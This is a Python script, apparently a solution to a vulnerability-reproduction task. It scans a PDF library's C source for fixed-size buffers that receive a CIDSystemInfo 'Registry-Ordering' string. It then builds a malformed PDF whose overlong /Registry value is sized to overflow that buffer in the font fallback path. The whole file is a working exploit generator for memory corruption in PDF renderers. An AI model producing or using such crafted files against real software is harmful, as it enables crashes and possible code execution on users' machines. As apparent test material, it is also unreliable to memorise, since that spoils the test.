import os
import re
import tarfile
import zipfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = self._detect_fallback_buffer_size(src_path)
        overflow = 8
        # Build "<Registry>-<Ordering>" slightly larger than buf_size to provoke overflow
        reg_len = max(1, buf_size + overflow - 2)  # minus "-" and 1 char ordering
        ord_len = 1

        registry = b"A" * reg_len
        ordering = b"B" * ord_len

        return self._make_pdf(registry, ordering)

    def _iter_source_files(self, src_path: str, keyword_filter: bool = True) -> Iterable[Tuple[str, bytes]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".inc", ".m", ".mm")
        keywords = ("cid", "cmap", "font", "pdf", "type0", "cjk", "cff", "truetype", "ttf")

        def want_path(p: str) -> bool:
            lp = p.lower()
            if not lp.endswith(exts):
                return False
            if not keyword_filter:
                return True
            return any(k in lp for k in keywords)

        max_file_size = 5_000_000

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    fp = os.path.join(root, fn)
                    rel = os.path.relpath(fp, src_path)
                    if not want_path(rel):
                        continue
                    try:
                        st = os.stat(fp)
                        if st.st_size <= 0 or st.st_size > max_file_size:
                            continue
                        with open(fp, "rb") as f:
                            yield rel, f.read()
                    except Exception:
                        continue
            return

        # Try tar
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    name = m.name
                    if not want_path(name):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
            return
        except Exception:
            pass

        # Try zip
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    if zi.file_size <= 0 or zi.file_size > max_file_size:
                        continue
                    name = zi.filename
                    if not want_path(name):
                        continue
                    try:
                        data = zf.read(zi)
                        yield name, data
                    except Exception:
                        continue
            return
        except Exception:
            pass

    def _detect_fallback_buffer_size(self, src_path: str) -> int:
        candidates: List[int] = []

        def scan_text(text: str) -> None:
            if "CIDSystemInfo" not in text and "cid" not in text.lower():
                return
            if "Registry" not in text and "Ordering" not in text:
                # still might use lowercase vars
                if "registry" not in text.lower() or "ordering" not in text.lower():
                    return

            arrays: Dict[str, int] = {}
            for m in re.finditer(r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]", text):
                try:
                    arrays[m.group(1)] = int(m.group(2))
                except Exception:
                    pass

            # sprintf(buf, "%s-%s", ...)
            for m in re.finditer(
                r"\b(?:sprint|vsprint)f\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"[^\"\n]*%s[^\"\n]*-[^\"\n]*%s[^\"\n]*\"",
                text,
            ):
                buf = m.group(1)
                sz = arrays.get(buf)
                if sz:
                    candidates.append(sz)

            # strcat(buf, "-") and later strcat(buf, ordering)
            # Very heuristic: look for strcat(buf,"-") and ensure 'ordering' appears near
            for m in re.finditer(r"\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"-\"\s*\)", text):
                buf = m.group(1)
                sz = arrays.get(buf)
                if not sz:
                    continue
                start = max(0, m.start() - 2000)
                end = min(len(text), m.end() + 2000)
                window = text[start:end].lower()
                if "registry" in window and "ordering" in window:
                    candidates.append(sz)

            # strcpy(buf, registry) then strcat(buf, ordering)
            for m in re.finditer(r"\bstrcpy\s*\(\s*([A-Za-z_]\w*)\s*,\s*([A-Za-z_]\w*)\s*\)", text):
                buf = m.group(1)
                src = m.group(2).lower()
                if "reg" not in src:
                    continue
                sz = arrays.get(buf)
                if not sz:
                    continue
                end = min(len(text), m.end() + 2500)
                window = text[m.start():end].lower()
                if ("strcat" in window or "sprintf" in window) and "ordering" in window:
                    candidates.append(sz)

        # First pass: keyword-filtered
        for _, data in self._iter_source_files(src_path, keyword_filter=True):
            try:
                scan_text(data.decode("latin1", "ignore"))
            except Exception:
                continue
            if candidates:
                # If we already found a small-ish buffer, stop early
                mn = min(candidates)
                if mn <= 1024:
                    break

        # Second pass: broader scan if nothing found
        if not candidates:
            for _, data in self._iter_source_files(src_path, keyword_filter=False):
                try:
                    scan_text(data.decode("latin1", "ignore"))
                except Exception:
                    continue
                if candidates:
                    mn = min(candidates)
                    if mn <= 1024:
                        break

        # Sensible default
        if not candidates:
            return 256

        mn = min(candidates)
        if mn < 16:
            return 16
        if mn > 1_000_000:
            return 256
        return mn

    def _make_pdf(self, registry: bytes, ordering: bytes) -> bytes:
        def lit_string(s: bytes) -> bytes:
            # Only uses A/B in our payload; no escaping required
            return b"(" + s + b")"

        # Content stream uses the font to ensure font load during rendering
        content = b"BT\n/F1 12 Tf\n72 720 Td\n(Hello) Tj\nET\n"

        objs: List[bytes] = []

        # 1: Catalog
        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page
        objs.append(
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            b"/Resources << /Font << /F1 4 0 R >> >> "
            b"/Contents 5 0 R >>"
        )

        # 4: Type0 font (keep /Encoding valid; omit keys that might reject parsing)
        objs.append(
            b"<< /Type /Font /Subtype /Type0 /BaseFont /F1 /Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>"
        )

        # 5: Contents stream
        stream_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>"
        objs.append(stream_dict + b"\nstream\n" + content + b"endstream")

        # 6: CIDFontType2; omit /BaseFont to encourage fallback usage
        cid_system_info = (
            b"<< /Registry " + lit_string(registry) +
            b" /Ordering " + lit_string(ordering) +
            b" /Supplement 0 >>"
        )
        objs.append(
            b"<< /Type /Font /Subtype /CIDFontType2 "
            b"/CIDSystemInfo " + cid_system_info +
            b" /FontDescriptor 7 0 R "
            b"/W [0 [500]] "
            b"/CIDToGIDMap /Identity >>"
        )

        # 7: FontDescriptor
        objs.append(
            b"<< /Type /FontDescriptor /FontName /F1 "
            b"/Flags 32 "
            b"/FontBBox [0 0 1000 1000] "
            b"/ItalicAngle 0 "
            b"/Ascent 800 "
            b"/Descent -200 "
            b"/CapHeight 700 "
            b"/StemV 80 >>"
        )

        out = bytearray()
        out += b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

        offsets: List[int] = [0]
        for i, body in enumerate(objs, start=1):
            offsets.append(len(out))
            out += str(i).encode("ascii") + b" 0 obj\n"
            out += body + b"\nendobj\n"

        xref_off = len(out)
        n = len(objs) + 1
        out += b"xref\n0 " + str(n).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, n):
            out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n<< /Size " + str(n).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n" + str(xref_off).encode("ascii") + b"\n%%EOF\n"
        return bytes(out)